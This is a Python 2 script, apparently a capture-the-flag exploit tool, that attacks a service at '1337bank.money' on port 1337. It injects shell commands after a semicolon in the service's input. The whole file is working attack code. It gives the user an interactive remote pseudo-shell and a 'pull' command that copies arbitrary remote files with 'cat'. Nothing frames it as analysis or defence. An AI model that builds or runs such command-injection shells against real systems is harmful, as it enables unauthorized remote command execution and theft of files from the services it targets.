import socket
import time

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(args):

    argList = args.split()
    cmd = argList[0]

    if (cmd == "shell"):
        dirList = []
        currDir = "/"
        shellCmd = raw_input(currDir + "> ")

        while (shellCmd != "exit"):
            t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            t.connect((host, port))

            if shellCmd[:2] == "cd":
                args = shellCmd.split()
                if args[1] == "..":
                    if (len(dirList) != 0):
                        dirList.pop() 
                else:
                    dirList.append(args[1])
                if len(dirList) == 0:
                    currDir = "/"
                else: 
                    currDir = "/".join(dirList)

            t.recv(1024)
            t.send("1337bank.money; " + "cd " + currDir + "; " + shellCmd + "\n")
            time.sleep(2)
            returnData = t.recv(4096) 
            # potential flaw - if the return data is more than 4096 bytes, it will
            # flow over into the next receive call as well, for example if it is more
            # than three times as much data as 4096 bytes, it will take four more 
            # receive calls until the desired data is printed
            output = returnData.splitlines()[20:]
            print(" ".join(output))

            t.close()
            shellCmd = raw_input(currDir + "> ")
            

    if (cmd == "help"):
        print("help: shows this help menu"
            + "\nshell: drop into an interactive shell and allow users to gracefully exit"
            + "\npull <remote-path> <local-path>: download files"
            + "\nquit: quit the shell")

    if (cmd == "pull"):
        if (len(argList) == 3):
            remote = argList[1]
            local = open(argList[2], 'w+')
            t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            t.connect((host, port))
            t.recv(1024)
            t.send("1337bank.money; cat " + remote + "\n")
            time.sleep(1)
            returnData = t.recv(4096) # same flaw as earlier (line 36)
            output = returnData.splitlines()[20:]
            t.close() 
            local.writelines(output)
            local.write("\n")
            local.close()

        else:
            print("incorrect number of arguments")

if __name__ == '__main__':
    cmd = raw_input("> ")
    while (cmd != "quit"):
        execute_cmd(cmd)
        cmd = raw_input("> ")

